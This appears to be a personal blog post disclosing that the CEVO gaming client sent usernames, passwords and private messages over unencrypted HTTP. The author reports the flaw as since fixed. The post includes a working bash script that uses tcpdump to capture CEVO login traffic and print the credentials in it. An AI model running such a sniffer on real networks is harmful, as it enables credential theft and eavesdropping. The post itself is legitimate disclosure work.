<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=themecolor content="#141419"><meta name=viewport content="width=device-width,initial-scale=1"><title>pulsifer.ca &#8605; Posts</title><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><meta name=apple-mobile-web-app-title content="pulsifer.ca"><meta name=application-name content="pulsifer.ca"><meta name=msapplication-TileColor content="#a9a9fd"><meta name=theme-color content="#a9a9bd"><link rel=canonical href=/posts/><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=icon href=/favicon.ico><link rel=manifest href=/manifest.webmanifest><link rel=stylesheet type=text/css href=/style.min.3aa99080b6194a8dec0a1fd9ade870849c7acf9f44bffe89f6af9be62e868666.css><link rel=stylesheet href=https://maxst.icons8.com/vue-static/landings/line-awesome/line-awesome/1.3.0/css/line-awesome.min.css><meta property="og:title" content="Posts"><meta property="og:description" content><meta property="og:type" content="website"><meta property="og:url" content="/posts/"><meta name=twitter:card content="summary"><meta name=twitter:title content="Posts"><meta name=twitter:description content></head><body><div class=container><header class=page-header><div class=page-header-inner><div class=logo><span class=prompt>❯</span>
<a href=/>pulsifer.ca</a></div><nav class=site-nav><ul><li><a href=/about>about</a></li><li><a href=/archive>archive</a></li></ul></nav></div></header><div class=content><main><h1>Posts</h1><article><a href=/posts/cevo-information-disclosure/><h2>CEVO Client Information Disclosure</h2></a><h3 id=tldr>tl;dr</h3><p>CEVO was a global eSports company built around North America’s largest competitive online PC gaming league. The CEVO client is software that is mandatory to be run during online play. The client was transmitting user authentication details (usernames and passwords) and private conversations in clear text which made them susceptible to eavesdropping attacks.</p><hr><p>Good day CS:GO friends!</p><p>Reference: <a href=https://www.reddit.com/r/GlobalOffensive/comments/2wl8qz/warning_esea_shows_complete_disregard_for_your/>/r/globaloffensive post</a> about <a href=https://play.esea.net>ESEA</a>&rsquo;s password security from early spring 2015.</p><p>I had a couple of the guys over this weekend to play some video games and of course CS:GO was on our list. We decided to download the <a href=https://cevo.com>CEVO</a> client because of the cost of ESEA and our skill differences in matchmaking. I recalled a <a href=https://www.reddit.com/r/GlobalOffensive/comments/2wl8qz/warning_esea_shows_complete_disregard_for_your/>Reddit post</a> from this spring and decided to double check that CEVO would at least take the lessons learned from the attacks on ESEA and secure their users. I was wrong!</p><p>While the CEVO website has enabled HTTPS, [arguably] the most important part of their business, the client, is verifying login details and more in plain ol&rsquo; HTTP. How does that work?</p><p>Whenever a client authenticates with a website or web based application, typically, an <code>HTTP POST</code> request is generated. The <code>HTTP POST</code> request contains your account credentials (email address for CEVO, username for ESEA) and password. This is completely normal. The big difference here is that services like Google, Facebook, banks, .etc, use TLS (transport layer security) to encrypt the data between your computer and the server responsible for performing the authentication so no one else can see it; CEVO does not.</p><p>Not only does the client not encrypt login credentials, <strong>all communication over the client happens over HTTP</strong> which means your private messages are also disclosed to whoever is listening.</p><p>So what? Who cares?</p><p>With things like prize pools totaling over USD$150,000 and the CS:GO skins gambling economy, it would be trivial for a malicious person to harvest professional players&rsquo; information from large CEVO events and use that information to DoS an entire event for fun and profit!</p><p>How can I check?</p><p>If you&rsquo;re not that savvy with Linux you could always use something like <a href=https://en.wikipedia.org/wiki/Fiddler_(software)>Fiddler</a> or <a href=https://www.wireshark.org/>Wireshark</a> to do the heavy lifting for you if. Here&rsquo;s what fiddler looks like:</p><figure><a href=fiddler-cevo.png><img src=fiddler-cevo.png width=100%></a><figcaption><h4>Fiddler showing HTTP results</h4></figcaption></figure><p>If you prefer the command line, use something like <code>tcpdump</code> and string search your way to freedom.</p><div class=highlight><div style=color:#fff;background-color:#1f1f24;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#fff;background-color:#1f1f24;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#fff;background-color:#1f1f24;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#fd8f3f>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#fd8f3f></span><span style=color:#6c7986># This script returns CEVO client usernames and passwords from live network traffic</span>
</span></span><span style=display:flex><span><span style=color:#6c7986># Hook your Linux laptop into a SPAN near the edge and enjoy</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6c7986># Usage:</span>
</span></span><span style=display:flex><span><span style=color:#6c7986># ./cevo.sh &lt;interface name&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#41a1c0>CEVOIP</span>=<span style=color:#fc5fa3>$(</span>dig +short cevo.com<span style=color:#fc5fa3>)</span>
</span></span><span style=display:flex><span><span style=color:#41a1c0>IPCOUNT</span>=<span style=color:#fc5fa3>$(</span><span style=color:#d0a8ff>echo</span> <span style=color:#41a1c0>$CEVOIP</span> | wc -w<span style=color:#fc5fa3>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#fc5fa3>if</span> [ -z <span style=color:#41a1c0>$1</span> ]; <span style=color:#fc5fa3>then</span> <span style=color:#d0a8ff>echo</span> <span style=color:#fc6a5d>&#34;Supply an interface to capture on. (eg ./cevo.sh eth0)&#34;</span>; <span style=color:#d0a8ff>exit</span> 1; <span style=color:#fc5fa3>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#41a1c0>INTERFACE</span>=<span style=color:#41a1c0>$1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6c7986># check if supplied interface exists</span>
</span></span><span style=display:flex><span>ifconfig <span style=color:#41a1c0>$INTERFACE</span> 2&gt;&amp;<span style=color:#d0bf69>1</span> &gt; /dev/null; <span style=color:#fc5fa3>if</span> [ <span style=color:#41a1c0>$?</span> -gt <span style=color:#d0bf69>0</span> ]; <span style=color:#fc5fa3>then</span> <span style=color:#d0a8ff>echo</span> <span style=color:#fc6a5d>&#34;Can&#39;t find interface. Exiting.&#34;</span>; <span style=color:#d0a8ff>exit</span> 1; <span style=color:#fc5fa3>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6c7986># Multiple IP logic</span>
</span></span><span style=display:flex><span><span style=color:#fc5fa3>if</span> [ <span style=color:#41a1c0>$IPCOUNT</span> -gt <span style=color:#d0bf69>1</span> ]; <span style=color:#fc5fa3>then</span>
</span></span><span style=display:flex><span>        <span style=color:#41a1c0>BPF_HOST</span>=<span style=color:#fc5fa3>$(</span><span style=color:#d0a8ff>echo</span> <span style=color:#41a1c0>$CEVOIP</span> | sed <span style=color:#fc6a5d>&#39;s/[[:blank:]]/ or /g&#39;</span><span style=color:#fc5fa3>)</span>
</span></span><span style=display:flex><span><span style=color:#fc5fa3>else</span>
</span></span><span style=display:flex><span>        <span style=color:#41a1c0>BPF_HOST</span>=<span style=color:#fc5fa3>$(</span><span style=color:#d0a8ff>echo</span> <span style=color:#41a1c0>$CEVOIP</span> | sed <span style=color:#fc6a5d>&#39;s/[[:blank:]]+//g&#39;</span><span style=color:#fc5fa3>)</span>
</span></span><span style=display:flex><span><span style=color:#fc5fa3>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#41a1c0>BPF</span>=<span style=color:#fc6a5d>&#34;tcp and port 80 and dst host (</span><span style=color:#41a1c0>$BPF_HOST</span><span style=color:#fc6a5d>)&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#d0a8ff>echo</span> <span style=color:#fc6a5d>&#34;Running (end with ^C)...&#34;</span>
</span></span><span style=display:flex><span>tcpdump -ln -i <span style=color:#41a1c0>$INTERFACE</span> -A <span style=color:#fc6a5d>&#34;</span><span style=color:#41a1c0>$BPF</span><span style=color:#fc6a5d>&#34;</span> 2&gt;/dev/null | <span style=color:#fc5fa3>while</span> <span style=color:#d0a8ff>read</span> CREDZ; <span style=color:#fc5fa3>do</span>
</span></span><span style=display:flex><span>        <span style=color:#d0a8ff>echo</span> <span style=color:#41a1c0>$CREDZ</span> | grep -E <span style=color:#fc6a5d>&#39;^redirect-url&#39;</span> | awk -F<span style=color:#fc6a5d>&#34;[&amp;=]&#34;</span> <span style=color:#fc6a5d>&#39;{print &#34;Login:&#34;,$4,&#34;\tPassword:&#34;,$6}&#39;</span> | sed <span style=color:#fc6a5d>&#39;s/%40/@/g&#39;</span>
</span></span><span style=display:flex><span><span style=color:#fc5fa3>done</span>
</span></span></code></pre></td></tr></table></div></div><figure><a href=tcpdump-cevo.gif><img src=tcpdump-cevo.gif width=100%></a><figcaption><h4>tcpdump showing usernames and passwords</h4></figcaption></figure><p><del>So, until this gets fixed, I would exercise extreme caution when logging in via the CEVO client to play some games, especially on a network that you do not trust.</del> It&rsquo;s fixed 😄</p></article></main></div><footer><div class=social><p class=social-header>Find me on the internet</p><ul class=icons><li><a href=https://github.com/jonpulsifer target=_blank><i class="lab la-github"></i></a></li><li><a href=https://instagr.am/jonpulsifer.ca target=_blank><i class="lab la-instagram"></i></a></li><li><a href=https://linkedin.com/in/jonpulsifer target=_blank><i class="lab la-linkedin"></i></a></li><li><a href=https://steamcommunity.com/id/jawn target=_blank><i class="lab la-steam"></i></a></li><li><a href=https://twitter.com/jonpulsifer target=_blank><i class="lab la-twitter"></i></a></li></ul></div><div class=powered-by><span class=colored-separator>&copy;</span> 2023 <a href=/>pulsifer.ca</a> <span class=colored-separator>&#8277;</span> Powered by <a href=https://gohugo.io target=_blank>Hugo</a></div></footer></div></body></html>